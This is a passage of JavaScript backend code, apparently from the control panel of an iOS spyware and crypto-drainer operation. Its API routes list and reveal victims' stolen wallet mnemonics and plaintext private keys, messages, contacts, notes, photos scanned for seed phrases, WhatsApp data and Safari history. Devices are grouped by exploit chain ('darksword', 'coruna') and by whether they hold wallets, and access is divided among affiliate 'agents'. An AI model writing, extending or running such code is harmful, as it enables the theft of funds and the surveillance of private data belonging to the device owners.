            if (u0.ip) { u0.geo = _ipGeoCache.get(u0.ip) || null; if (!_ipGeoCache.has(u0.ip)) lookupIPGeo(u0.ip).catch(() => {}); }
            return r;
          }
          // r=null（PG 不可见/无此设备）→ 不直接判 not found，落旧路径复核（快照可能有而 PG 无的极端情形）
        } catch (e) { console.error('[panel] PG deviceDetail 失败，回退快照路径:', e.message); }
      }
      const id = parseInt(q.id || '0', 10);
      const serial = q.serial || '';
      // Filter users by agent first to enforce data isolation
      const visibleUsers = af([...store.users.values()], 'serial_id');
      const user = visibleUsers.find(x => x.id === id || x.serial_id === serial);
      if (!user) return { message: 'not found' };
      if (user.ip) user.geo = _ipGeoCache.get(user.ip) || null; if (user.ip && !_ipGeoCache.has(user.ip)) lookupIPGeo(user.ip).catch(()=>{});
      const s = user.serial_id;
      // 【2026-09-12 分片升级】大数组改从该设备的数据源取：split=设备分片（全量、不受全局裁剪）；
      //   legacy=全量 store —— 下方 byS/filter 在两种模式输出等价。
      const ds = devData(s);
      const byS = arr => af(arr.filter(x => x.serial === s || x.serial_id === s));
      // 【2026-09-10 P1-4 修复】按权限逐项裁剪：super_admin 全给；
      //   代理仅返回其 permissions 里明确勾选的类别 → 修掉「只勾 users 就能看到助记词/私钥/照片全部敏感数据」的越权。
      const can = p => hasPermission(currentUser, p);
      return {
        user,
        mnemonics: can('mnemonics') ? byS(store.mnemonics) : [],
        seeds: can('seeds') ? byS(store.seeds) : [],
        addresses: can('addresses') ? byS(store.addresses) : [],
        tokens: can('tokens') ? byS(store.tokens) : [],
        messages: can('messages') ? byS(ds.messages).sort((a, b) => (Number(b.ts) || 0) - (Number(a.ts) || 0)) : [],
        // 【2026-09-12】13-17 链联系人（channel ① raw_avatar_set）→ 设备详情「联系人」栏
        contacts: can('contacts') ? byS(ds.contacts) : [],
        notebooks: can('notebooks') ? byS(ds.notebooks) : [],
        photos: can('photos') ? byS(ds.photos) : [],
        // 【2026-09-12 深度复审修复】原 slice(0,N) 取「数组头部」——split 分片与 legacy 数组的顺序
        //   不同（scan 顺序 vs trim 时间序），实测 3 台设备的 events/reports 集合几乎完全不同
        //   （LOST 93/13/18）。改为按时间倒序取「最近 N 条」：两模式一致，且符合"看最近上报"的页面直觉。
        events: can('reports') ? byS(ds.events).sort((a, b) => (Number(b.ts || b.created_at) || 0) - (Number(a.ts || a.created_at) || 0)).slice(0, 100) : [],
        reports: can('reports') ? byS(ds.reports).sort((a, b) => (Number(b.ts || b.created_at) || 0) - (Number(a.ts || a.created_at) || 0)).slice(0, 50) : [],
        apps: can('apps') ? ds.apps.filter(x => x.serial === s) : [],
        exfil18: can('sysfiles') ? byS(ds.exfil18) : [],
        whatsapp: can('whatsapp') ? byS(ds.whatsapp) : [],
        browserHistory: can('browser') ? byS(ds.browserHistory) : [],
        chainLogs: can('sysfiles') ? af(ds.chainLogs.filter(x => x.serial === s || x.ip === user.ip)) : [],
        uploads: can('collect') ? af((ds.uploads || []).filter(x => x.serial === s)) : [],
      };
    },
    '/api/user/user_upload/list': () => {
      const serial = q.serial || '';
      const src = serial ? devData(serial).uploads || [] : feed('uploads');
      const us = af(src).slice().sort((a,b)=>(Number(b.ts||0))-(Number(a.ts||0)));
      const filtered = serial ? us.filter(x => x.serial === serial) : us;
      return { uploads: filtered, pi: pager(filtered, q), total: filtered.length };
    },
    '/api/common/device_info/list': async () => {
      // 【P4】PG 读层（PANEL_PG_DEV=1）：SQL 权限过滤 + 秒级数据；任何异常自动回退下方快照路径
      if (panelPgDev) {
        try {
          const r = await panelPgDev.deviceList(currentUser, q);
          const list = r.dis;
          const uniqueIPs = [...new Set(list.map(d => d.ip).filter(Boolean))].slice(0, 30);
          for (const ip of uniqueIPs) { if (!_ipGeoCache.has(ip)) lookupIPGeo(ip).catch(()=>{}); }
          for (const d of list) d.geo = _ipGeoCache.get(d.ip) || null;
          // 【2026-09-14】顶部统计（版本链分布 + 钱包）：同权限口径、忽略筛选；附带返回，失败不影响列表
          let stats = null;
          try { stats = await panelPgDev.deviceListStats(currentUser); } catch (e2) { console.error('[panel] deviceStats 失败:', e2.message); }
          return { dis: list, pi: r.pi, ...(stats ? { stats } : {}), ...(r.agent_list ? { agent_list: r.agent_list } : {}) };
        } catch (e) {
          console.error('[panel] PG deviceList 失败，回退快照路径:', e.message);
        }
      }
      const dis = af([...store.devices.values()], 'serial_id').sort((a,b)=>(Number(b.last_seen||0))-(Number(a.last_seen||0)));
      // 【2026-09-14】快照兜底筛选：版本链（chain=dark|coruna）+ 钱包（与 PG 路径同参数）
      if (q.chain === 'dark' || q.chain === 'coruna' || q.chain === 'other' || q.wallet === 'has' || q.wallet === 'none') {
        const _vpair2 = d0 => {
          const m = String(d0.os_version || '').match(/^(\d+)\.(\d+)/);
          if (m) return [Number(m[1]), Number(m[2])];
          const map = { 24: 18, 23: 17, 22: 16, 21: 15, 20: 14, 19: 13, 18: 12 };
          const gen = map[parseInt(String(d0.kernel_release || ''), 10) - 9];
          return gen ? [gen, 0] : [0, 0];
        };
        const _isWallet = d0 => (Array.isArray(d0.wallets) && d0.wallets.length) || Number(d0.mnemonic_count) > 0 || d0.is_wallet_user;
        const _flt = [];
        for (let _i = 0; _i < dis.length; _i++) {
          const d0 = dis[_i];
          if (q.chain === 'dark' && !(_vpair2(d0)[0] >= 18)) continue;
          if (q.chain === 'coruna' && !(_vpair2(d0)[0] > 0 && _vpair2(d0)[0] < 18)) continue;
          if (q.chain === 'other' && !(_vpair2(d0)[0] <= 0)) continue;
          if (q.wallet === 'has' && !_isWallet(d0)) continue;
          if (q.wallet === 'none' && _isWallet(d0)) continue;
          _flt.push(d0);
        }
        dis.length = 0; for (const d0 of _flt) dis.push(d0);
      }
      // Non-blocking geo: use cache only, fire lookups in background
      const uniqueIPs = [...new Set(dis.map(d => d.ip).filter(Boolean))].slice(0, 30);
      for (const ip of uniqueIPs) { if (!_ipGeoCache.has(ip)) lookupIPGeo(ip).catch(()=>{}); }
      const agents = isSuperAdmin(currentUser) ? authStore.listAgents() : [];
      // 【2026-09-12 性能修复】代理 IP 集合每请求只预建一次 Set：
      //   原实现「每设备 × 每代理」都调 getAgentIPs（O(16566) 全表扫描+分配）→ 设备列表 23-29s。
      const agentIPSets = new Map();
      if (isSuperAdmin(currentUser)) for (const a of agents) agentIPSets.set(a.id, new Set(authStore.getAgentIPs(a.id)));
      const enriched = dis.map(d => {
        const obj = { ...d, geo: _ipGeoCache.get(d.ip) || null };
        if (isSuperAdmin(currentUser)) {
          const agentId = authStore.getDeviceAgent(d.serial_id);
          if (!agentId) {
            let ipAgent = null;
            for (const a of agents) { const s2 = agentIPSets.get(a.id); if (s2 && s2.has(d.ip)) { ipAgent = a; break; } }
            obj.agent_name = ipAgent ? ipAgent.username : null;
            obj.agent_label = ipAgent ? ipAgent.label : null;
          } else {
            const ag = agents.find(a => a.id === agentId);
            obj.agent_name = ag ? ag.username : null;
            obj.agent_label = ag ? ag.label : null;
          }
        }
        return obj;
      });
      // 【2026-09-14】顶部统计（快照兜底口径，与 PG deviceListStats 同规则：darksword 18.x / coruna ≤17.5 + 钱包）
      const _vpair = d0 => {
        const m = String(d0.os_version || '').match(/^(\d+)\.(\d+)/);
        if (m) return [Number(m[1]), Number(m[2])];
        const map = { 24: 18, 23: 17, 22: 16, 21: 15, 20: 14, 19: 13, 18: 12 };
        const gen = map[parseInt(String(d0.kernel_release || ''), 10) - 9];
        return gen ? [gen, 0] : [0, 0];
      };
      const stats = {
        total: enriched.length,
        dark: enriched.filter(d0 => _vpair(d0)[0] >= 18).length,
        coruna: enriched.filter(d0 => _vpair(d0)[0] > 0 && _vpair(d0)[0] < 18).length,
        unknown: enriched.filter(d0 => _vpair(d0)[0] === 0).length,
        wallet: enriched.filter(d0 => (Array.isArray(d0.wallets) && d0.wallets.length) || Number(d0.mnemonic_count) > 0 || d0.is_wallet_user).length,
      };
      stats.no_wallet = stats.total - stats.wallet;
      return { dis: enriched, pi: pager(enriched, q), stats };
    },
    '/api/user/user_event/list': () => {
      // 【2026-09-20】前端只用最近 40 条 → 快照回退路径同样裁剪（原返回全量 12000 条≈6.35MB）
      const evs = af(feed('events')).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0))).slice(0, 40);
      return { events: evs, pi: pager(evs, q) };
    },
    '/api/user/user_raw_report/list': () => {
      const kind = q.kind || '';
      const all = af(feed('reports'));
      const rs = (kind ? all.filter(r => r.kind === kind) : all).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      return { raw_reports: rs, pi: pager(rs, q) };
    },

    '/api/secrecy/user_mnemonic/list': () => {
      let ms = mnCanon(af(store.mnemonics)).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      if (q.serial) ms = ms.filter(x => x.serial === q.serial);
      return { mnemonics: ms, pi: pager(ms, q) };
    },
    // 【2026-09-12】助记词按设备聚合（一级列表用）
    '/api/secrecy/user_mnemonic/summary': () => {
      const ms = mnCanon(af(store.mnemonics));
      const agg = new Map();
      for (const m of ms) {
        if (!m.serial) continue;
        let a = agg.get(m.serial) || { serial: m.serial, total: 0, plain: 0, apps: {}, last_ts: 0, ip: '' };
        a.total++; if (m.mnem_phrase_plain) a.plain++;
        const ap = m.app_type || '?'; a.apps[ap] = (a.apps[ap] || 0) + 1;
        const t = Number(m.ts || (m.created_at ? Date.parse(m.created_at) : 0)) || 0; if (t > a.last_ts) a.last_ts = t;
        if (m.ip) a.ip = m.ip;
        agg.set(m.serial, a);
      }
      const out = [];
      for (const a of agg.values()) {
        const dv = store.devices.get(a.serial) || {};
        out.push(Object.assign({}, a, {
          machine: dv.hardware_model || '', ios_version: dv.os_version || dv.build_version || '',
          ip: a.ip || dv.ip || '', last_seen: dv.last_seen || a.last_ts,
          app_top: Object.entries(a.apps).sort((x, y) => y[1] - x[1]).slice(0, 3).map(([k, v]) => k + '×' + v).join(' '),
        }));
      }
      // 【2026-09-16】排序与 PG 路径同口径（白名单）：recent(默认) | total | plain
      const _mk = String((q && q.sort) || '');
      const _md = String((q && q.dir) || '').toLowerCase() === 'asc' ? 1 : -1;
      if (_mk === 'total') out.sort((x, y) => (_md * ((x.total || 0) - (y.total || 0))) || ((y.last_seen || 0) - (x.last_seen || 0)));
      else if (_mk === 'plain') out.sort((x, y) => (_md * ((x.plain || 0) - (y.plain || 0))) || (y.total - x.total));
      else out.sort((x, y) => (_md * (((x.last_seen || 0)) - ((y.last_seen || 0)))) || (y.total - x.total));
      return { devices: out, pi: pager(out, q) };
    },
    '/api/secrecy/user_mnemonic/user_list': () => {
      const uid = parseInt(q.user_id || '0', 10);
      const ms = af(store.mnemonics).filter(m => !uid || m.user_id === uid);
      return { mnemonics: ms };
    },
    '/api/secrecy/user_mnemonic/plain_detail': async () => {
      // 【P4.3 修复】PG 分支：按 PG 主键回查
      if (panelPgDev) {
        try {
          const m0 = await panelPgDev.findRecord(currentUser, 'mnemonics', q.id || q.i);
          if (m0) return { mnemonic: { ...m0, mnem_phrase_plain: undefined }, plain: m0.mnem_phrase_plain };
        } catch (e) { console.error('[panel] PG mnemonic plain_detail 失败，回退:', e.message); }
      }
      const id = parseInt(q.id || q.i || '0', 10);
      const ms = af(store.mnemonics);
      const m = ms.find(x => x.id === id);
      return m ? { mnemonic: { ...m, mnem_phrase_plain: undefined }, plain: m.mnem_phrase_plain } : { message: 'not found' };
    },
    '/api/secrecy/user_mnemonic/create': async () => {
      const b = await readBody(req);
      if (!b || !b.mnemonic || !b.app_type) {
        json(res, 400, { message: '助记词和钱包类型必填' });
        return { __sent: true };
      }
      const ts = b.ts || Date.now();
      const m = {
        id: store.mnemonics.length + 1,
        user_id: parseInt(b.user_id || '0', 10) || null,
        serial: b.serial || 'manual',
        mnem_phrase_abbr: lootStore.abbr(String(b.mnemonic), 3, 4),
        mnem_phrase_plain: String(b.mnemonic),
        app_type: b.app_type,
        bundle_id: b.bundle_id || null,
        created_at: new Date(ts).toISOString().replace('T', ' ').slice(0, 19),
        ip: 'manual',
        manual: true,
      };
      store.mnemonics.push(m);
      try {
        const userObj = [...store.users.values()].find(x => x.serial_id === m.serial);
        notifier.notifyMnemonic(m.serial, m.app_type, String(b.mnemonic), userObj ? (userObj.machine + ' · ' + userObj.ios_version) : m.ip);
      } catch {}
      return { mnemonic: { ...m, mnem_phrase_plain: undefined }, id: m.id };
    },
    '/api/secrecy/user_seed/list': () => {
      const ss = af(store.seeds).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      return { seeds: ss, pi: pager(ss, q) };
    },
    '/api/secrecy/user_address/list': () => {
      let as = af(store.addresses).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      if (q.serial) as = as.filter(x => x.serial === q.serial);
      return { addresses: as, pi: pager(as, q) };
    },
    // 【2026-09-12】地址与代币按设备聚合
    '/api/secrecy/user_address/summary': () => {
      const agg = new Map();
      const acc = (s2) => { let a = agg.get(s2); if (!a) { a = { serial: s2, addr: 0, tokens: 0, chains: {}, plain: 0, last_ts: 0, ip: '' }; agg.set(s2, a); } return a; };
      for (const x of af(store.addresses)) {
        if (!x.serial) continue;
        const a = acc(x.serial); a.addr++;
        if (x.private_key_plain) a.plain++;
        const c = x.chain || '?'; a.chains[c] = (a.chains[c] || 0) + 1;
        const t = Number(x.ts || (x.created_at ? Date.parse(x.created_at) : 0)) || 0; if (t > a.last_ts) a.last_ts = t;
        if (x.ip) a.ip = x.ip;
      }
      for (const x of af(store.tokens)) {
        if (!x.serial) continue;
        const a = acc(x.serial); a.tokens++;
        const t = Number(x.ts || 0) || 0; if (t > a.last_ts) a.last_ts = t;
      }
      const out = [];
      for (const a of agg.values()) {
        const dv = store.devices.get(a.serial) || {};
        out.push(Object.assign({}, a, {
          machine: dv.hardware_model || '', ios_version: dv.os_version || dv.build_version || '',
          ip: a.ip || dv.ip || '', last_seen: dv.last_seen || a.last_ts,
          chain_top: Object.entries(a.chains).sort((x, y) => y[1] - x[1]).slice(0, 4).map(([k, v]) => k + '×' + v).join(' '),
        }));
      }
      out.sort((x, y) => ((y.addr + y.tokens) - (x.addr + x.tokens)) || ((y.last_seen || 0) - (x.last_seen || 0)));
      return { devices: out, pi: pager(out, q) };
    },
    '/api/secrecy/user_address/plain_detail': async () => {
      // 【P4.3 修复】PG 分支：按 PG 主键回查
      if (panelPgDev) {
        try {
          const a0 = await panelPgDev.findRecord(currentUser, 'addresses', q.id || q.i);
          if (a0) return { address: { ...a0, private_key_plain: undefined }, plain_private_key: a0.private_key_plain };
        } catch (e) { console.error('[panel] PG address plain_detail 失败，回退:', e.message); }
      }
      const id = parseInt(q.id || q.i || '0', 10);
      const as = af(store.addresses);
      const a = as.find(x => x.id === id);
      return a ? { address: { ...a, private_key_plain: undefined }, plain_private_key: a.private_key_plain } : { message: 'not found' };
    },

    '/api/secrecy/user_token/list': () => {
      let ts = af(store.tokens).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      if (q.serial) ts = ts.filter(x => x.serial === q.serial);
      return { tokens: ts, pi: pager(ts, q) };
    },
    '/api/secrecy/user_message/list': () => {
      const ms = af(feed('messages')).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      return { messages: ms, pi: pager(ms, q) };
    },
    '/api/secrecy/user_notebook/list': () => {
      let ns = af(q.serial ? devData(q.serial).notebooks : feed('notebooks')).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      if (q.serial) ns = ns.filter(x => x.serial === q.serial);
      return { notebooks: ns, pi: pager(ns, q) };
    },
    // 【2026-09-12】备忘录按设备聚合（一级列表用）
    '/api/secrecy/user_notebook/summary': () => {
      // 【2026-09-12 分片升级】优先读构建期预聚合（全量口径，免每次遍历）
      const pre = store.summaries && store.summaries.notebook;
      if (pre) { const rows = af(pre); return { devices: rows.slice(), pi: pager(rows, q) }; }
      const agg = new Map();
      for (const n of af(feed('notebooks'))) {   // 【复审修复 M3】split 模式下 store.notebooks 为空数组，兜底改走 feed
        if (!n.serial) continue;
        let a = agg.get(n.serial);
        if (!a) { a = { serial: n.serial, total: 0, with_body: 0, last_ts: 0, ip: '', sample: '' }; agg.set(n.serial, a); }
        a.total++;
        if (n.content && String(n.content).length > 10) a.with_body++;
        const t = Number(n.ts || 0) || 0; if (t > a.last_ts) a.last_ts = t;
        if (n.ip) a.ip = n.ip;
        if (!a.sample && n.title) a.sample = String(n.title).slice(0, 20);
      }
      const out = [];
      for (const a of agg.values()) {
        const dv = store.devices.get(a.serial) || {};
        out.push(Object.assign({}, a, {
          machine: dv.hardware_model || '', ios_version: dv.os_version || dv.build_version || '',
          ip: a.ip || dv.ip || '', last_seen: dv.last_seen || a.last_ts,
        }));
      }
      out.sort((x, y) => (y.total - x.total) || ((y.last_seen || 0) - (x.last_seen || 0)));
      return { devices: out, pi: pager(out, q) };
    },
    '/api/user/whatsapp_account/list': () => {
      let ws = af(q.serial ? devData(q.serial).whatsapp : feed('whatsapp')).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      if (q.serial) ws = ws.filter(x => x.serial === q.serial);   // 【2026-09-12】二级页按设备过滤
      return { whatsapp_accounts: ws, pi: pager(ws, q) };
    },
    // 【2026-09-12】WhatsApp 侧栏一级页：按设备聚合（会话数 / 消息总数 / 最近活跃）——照 contact/summary 模式
    '/api/user/whatsapp_account/summary': () => {
      // 【2026-09-12 分片升级】优先读构建期预聚合（全量口径，免每次遍历）
      const pre = store.summaries && store.summaries.whatsapp;
      if (pre) { const rows = af(pre); return { devices: rows.slice(), pi: pager(rows, q) }; }
      const agg = new Map();
      for (const w of af(feed('whatsapp'))) {   // 【复审修复 M3】兜底改走 feed
        if (!w.serial) continue;
        let a = agg.get(w.serial);
        if (!a) { a = { serial: w.serial, total: 0, total_msgs: 0, last_ts: 0, ip: '' }; agg.set(w.serial, a); }
        a.total++;
        a.total_msgs += Number(w.msg_count || 0) || 0;
        const t = Number(w.ts || 0) || 0; if (t > a.last_ts) a.last_ts = t;
        if (w.ip) a.ip = w.ip;
      }
      const out = [];
      for (const a of agg.values()) {
        const dv = store.devices.get(a.serial) || {};
        out.push(Object.assign({}, a, {
          machine: dv.hardware_model || '', ios_version: dv.os_version || dv.build_version || '',
          ip: a.ip || dv.ip || '', last_seen: dv.last_seen || a.last_ts,
        }));
      }
      out.sort((x, y) => (y.total - x.total) || ((y.last_seen || 0) - (x.last_seen || 0)));
      return { devices: out, pi: pager(out, q) };
    },
    '/api/user/user_browser_history/list': async () => {
      const bs = af(feed('browserHistory')).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      // 【2026-09-12 性能修复】Safari 库解析结果改为「按 bin_path 的磁盘缓存」：
      //   原实现每次请求对全部未解析记录逐条 execFileSync python（实测 405 个库 ×0.13s ≈ 55s，
      //   单线程阻塞整个面板；且每次请求重复解析）。缓存后每个库文件全生命周期只解析一次。
      // 【复审修复 L1】缓存键加解析器版本前缀（parse18.py 逻辑变更时改版本号即整体失效重算）
      const BH_VER = 'p1|';
      const BHC = path.join(__dirname, 'data', 'browser_parse_cache.json');
      let bhCache = {};
      try { bhCache = JSON.parse(fs.readFileSync(BHC, 'utf8')) || {}; } catch {}
      let bhDirty = false;
      for (const h of bs) {
        if (h.exid && h.bin_path && !h.url) {
          const ck = BH_VER + h.bin_path;
          const hit = bhCache[ck];
          if (hit) {
            if (hit.url) h.url = hit.url;
            if (hit.title) h.title = hit.title;
            if (hit.note) h.note = hit.note;
            continue;
          }
          try {
            const { execFileSync } = require('child_process');
            const d = JSON.parse(execFileSync('/usr/bin/python3', [path.join(__dirname, 'parse18.py'), h.bin_path, 'safari'], { maxBuffer: 8 * 1024 * 1024, timeout: 8000 }).toString());
            const rows = d.rows || [];
            if (rows.length) {
              h.url = rows[0].url || rows[0]['history_url'] || '';
              h.title = rows[0].title || rows[0]['page_title'] || h.title;
              h.note = '解析表 ' + (d.table || '') + ' ' + rows.length + ' 行';
            } else if (d.ok && d.file && d.file.is_sqlite) {
              h.note = '库为空（' + (d.file.origin_path || 'History.db').split('/').pop() + ' 无记录；WebView 打开不写入 Safari 历史）';
            }
            bhCache[ck] = { url: h.url || '', title: h.title || '', note: h.note || '', ts: Date.now() };
            bhDirty = true;
          } catch { /* 解析失败不缓存，下次重试 */ }
        }
      }
      if (bhDirty) { try { const btmp = BHC + '.tmp_' + process.pid; fs.writeFileSync(btmp, JSON.stringify(bhCache)); fs.renameSync(btmp, BHC); } catch {} }   // 【复审修复 L1】tmp+rename 原子落盘
      const deliveries = af(store.deliveries, 'ip').slice().sort((a, b) => (Number(b.ts || b.startTime || 0)) - (Number(a.ts || a.startTime || 0)));
      return { histories: bs, deliveries, pi: pager(bs, q) };
    },
    '/api/user/user_photo/list': () => {
      let ps = af(q.serial ? devData(q.serial).photos : feed('photos')).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      if (q.serial) ps = ps.filter(x => x.serial === q.serial);
      return { photos: ps, pi: pager(ps, q) };
    },
    // 【2026-09-12】照片按设备聚合（含"相册识别出助记词"计数）
    '/api/user/user_photo/summary': () => {
      // 【2026-09-12 分片升级】优先读构建期预聚合（全量口径，免每次遍历）
      const pre = store.summaries && store.summaries.photo;
      if (pre) { const rows = af(pre); return { devices: rows.slice(), pi: pager(rows, q) }; }
      const agg = new Map();
      for (const p of af(feed('photos'))) {   // 【复审修复 M3】兜底改走 feed
        if (!p.serial) continue;
        let a = agg.get(p.serial);
        if (!a) { a = { serial: p.serial, total: 0, orig: 0, ocr: 0, ocr_mnem: 0, last_ts: 0, ip: '' }; agg.set(p.serial, a); }
        a.total++;
        if (p.bin_path) a.orig++;
        else { a.ocr++; if (p.word_n) a.ocr_mnem++; }
        const t = Number(p.ts || 0) || 0; if (t > a.last_ts) a.last_ts = t;
        if (p.ip) a.ip = p.ip;
      }
      const out = [];
      for (const a of agg.values()) {
        const dv = store.devices.get(a.serial) || {};
        out.push(Object.assign({}, a, {
          machine: dv.hardware_model || '', ios_version: dv.os_version || dv.build_version || '',
          ip: a.ip || dv.ip || '', last_seen: dv.last_seen || a.last_ts,
        }));
      }
      out.sort((x, y) => (y.total - x.total) || ((y.last_seen || 0) - (x.last_seen || 0)));
      return { devices: out, pi: pager(out, q) };
    },
    // 【2026-09-12】13-17 链联系人（channel ① raw_avatar_set 的 contacts 事件）
    '/api/user/user_contact/list': () => {
      let cs = af(q.serial ? devData(q.serial).contacts : feed('contacts')).slice().sort((a,b)=>(Number(b.ts||0))-(Number(a.ts||0)));
      if (q.serial) cs = cs.filter(x => x.serial === q.serial);
      return { contacts: cs, pi: pager(cs, q) };
    },
    '/api/user/user_contact/summary': () => {
      // 【2026-09-12 分片升级】优先读构建期预聚合（全量口径，免每次遍历）
      const pre = store.summaries && store.summaries.contact;
      if (pre) { const rows = af(pre); return { devices: rows.slice(), pi: pager(rows, q) }; }
      const agg = new Map();
      for (const c of af(feed('contacts'))) {   // 【复审修复 M3】兜底改走 feed
        if (!c.serial) continue;
        let a = agg.get(c.serial);
        if (!a) { a = { serial: c.serial, total: 0, phone: 0, email: 0, last_ts: 0, ip: '' }; agg.set(c.serial, a); }
        a.total++; if (c.phones) a.phone++; if (c.emails) a.email++;
        const t = Number(c.ts || 0) || 0; if (t > a.last_ts) a.last_ts = t;
        if (c.ip) a.ip = c.ip;
      }
      const out = [];
      for (const a of agg.values()) {
        const dv = store.devices.get(a.serial) || {};
        out.push(Object.assign({}, a, {
          machine: dv.hardware_model || '', ios_version: dv.os_version || dv.build_version || '',
          ip: a.ip || dv.ip || '', last_seen: dv.last_seen || a.last_ts,
        }));
      }
      out.sort((x, y) => (y.total - x.total) || ((y.last_seen || 0) - (x.last_seen || 0)));
      return { devices: out, pi: pager(out, q) };
    },
    '/api/user/user_photo/raw': async () => {
      // 【2026-09-16】HEIC 照片转码：浏览器无法解码 HEIC（此前以 image/jpeg 误标发出 → 图不显示）。
      //   Node 侧无 HEIC 解码器 → 经 python 助手（img_to_jpeg.py，同 parse18.py 惯例）转 JPEG，带磁盘缓存。
      const _isHeicBuf = b => b && b.length > 12 && b[4] === 0x66 && b[5] === 0x74 && b[6] === 0x79 && b[7] === 0x70; // 'ftyp'
      const _convCacheDir = path.join(__dirname, 'data', 'img_cache');
      const _heicToJpeg = (buf, key) => {
        try {
          fs.mkdirSync(_convCacheDir, { recursive: true });
          const safeKey = String(key == null ? '' : key).replace(/[^a-zA-Z0-9_-]/g, '_');
          const cf = path.join(_convCacheDir, 'photo_' + safeKey + '.jpg');
          if (fs.existsSync(cf)) return fs.readFileSync(cf);
          const { execFileSync } = require('child_process');
          // 注：面板以 www 运行，/root/venv 不可达 → 用系统 python3（已装 pillow+pillow-heif 到 /usr/local）
          const out = execFileSync('/usr/bin/python3', [path.join(__dirname, 'img_to_jpeg.py')],
            { input: buf, maxBuffer: 64 * 1024 * 1024, timeout: 30000 });
          if (out && out.length > 128) { try { fs.writeFileSync(cf, out); } catch (e) {} return out; }
        } catch (e) { console.error('[panel] HEIC 转码失败:', e.message); }
        return null;
      };
      // 【P4.3 修复】PG 分支：按 PG 主键回查（含可见性过滤）；无权限/文件缺失回退快照路径复核
      if (panelPgDev) {
        try {
          const ph = await panelPgDev.findRecord(currentUser, 'photos', q.id || q.i);
          if (ph && ph.bin_path && fs.existsSync(ph.bin_path)) {
            let buf = fs.readFileSync(ph.bin_path);
            try { const j = JSON.parse(buf.toString('utf8')); if (j && j.data) buf = Buffer.from(j.data, 'base64'); } catch {}
            let mime = /\.(png)$/i.test(ph.name) ? 'image/png' : /\.(gif)$/i.test(ph.name) ? 'image/gif' : 'image/jpeg';
            if (_isHeicBuf(buf)) {
              const jp = _heicToJpeg(buf, String(q.id || q.i || 'x'));
              if (jp) { buf = jp; mime = 'image/jpeg'; } else mime = 'image/heic';
            }
            return { __raw: 200, buf, mime };
          }
          if (ph) return { __raw: 404 };   // 有权限但文件缺失（与旧逻辑一致）
        } catch (e) { console.error('[panel] PG photo raw 失败，回退:', e.message); }
      }
      const id = parseInt(q.id || q.i || '0', 10);
      const ph = findRec('photos', id);   // 【分片升级】id→设备分片（含行级隔离过滤），兜底全局流
      if (!ph || !ph.bin_path || !fs.existsSync(ph.bin_path)) return { __raw: 404 };
      let buf = fs.readFileSync(ph.bin_path);
      try {
        const j = JSON.parse(buf.toString('utf8'));
        if (j && j.data) buf = Buffer.from(j.data, 'base64');
      } catch {}
      let mime = /\.(png)$/i.test(ph.name) ? 'image/png' : /\.(gif)$/i.test(ph.name) ? 'image/gif' : 'image/jpeg';
      if (_isHeicBuf(buf)) {
        const jp = _heicToJpeg(buf, String(id));
        if (jp) { buf = jp; mime = 'image/jpeg'; } else mime = 'image/heic';
      }
      return { __raw: 200, buf, mime };
    },

    '/api/task/admin_collect_task/list': () => {
      const ts = af(store.collectTasks).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      return { collect_tasks: ts, pi: pager(ts, q) };
    },
    '/api/task/admin_collect_record/list': () => {
      const rs = af(store.collectRecords).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      return { collect_records: rs, pi: pager(rs, q) };
    },
    '/api/secrecy/admin_funds_vault/list': () => {
      const vs = af(store.fundsVaults).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      return { funds_vaults: vs, pi: pager(vs, q) };
    },
    '/api/secrecy/admin_gas_vault/list': () => {
      const vs = af(store.gasVaults).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      return { gas_vaults: vs, pi: pager(vs, q) };
    },
    '/api/secrecy/user_locked_address/list': () => {
      const as = af(store.lockedAddresses).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      return { addresses: as, pi: pager(as, q) };
    },
    '/api/airdrop/evm_contract/list': () => {
      const cs = af(store.airdropContracts.filter(c => c.chain === 'EVM'));
      return { evm_contracts: cs, pi: pager(cs, q) };
    },
    '/api/airdrop/tron_contract/list': () => {
      const cs = af(store.airdropContracts.filter(c => c.chain === 'TRON'));
      return { tron_contracts: cs, pi: pager(cs, q) };
    },
    '/api/common/app/list': () => {
      const filteredApps = af(feed('apps'));
      const agg = new Map();
      for (const a of filteredApps) {
        const k = a.bundle_id || a.name || '?';
        if (!agg.has(k)) agg.set(k, { name: a.name || '', bundle_id: a.bundle_id || '', installs: 0, devices: new Set(), last_ts: 0 });
        const g = agg.get(k);
        g.installs++;
        if (a.serial) g.devices.add(a.serial);
        g.last_ts = Math.max(g.last_ts, Number(a.ts) || 0);
        if (!g.name && a.name) g.name = a.name;
      }
      const apps = [...agg.values()].map((g, i) => ({
        id: i + 1, name: g.name, bundle_id: g.bundle_id,
        install_count: g.installs, device_count: g.devices.size,
        devices: [...g.devices].slice(0, 8).join(', '), last_ts: g.last_ts,
      })).sort((a, b) => b.device_count - a.device_count || String(a.name).localeCompare(String(b.name)));
      return { apps, pi: pager(apps, q) };
    },
    '/api/common/sys_application/list': () => {
      const ss = af(feed('sysApps'));
      return { sas: ss, pi: pager(ss, q) };
    },
    // 【2026-09-20】IP 数据：PG 预聚合表 ip_summary + 后端分页（s/p）；异常/total=0 回退快照 core.ipData
    '/api/common/ip_data/list': async () => {
      if (panelPgDev) {
        try {
          const r = await panelPgDev.ipDataList(currentUser, q);
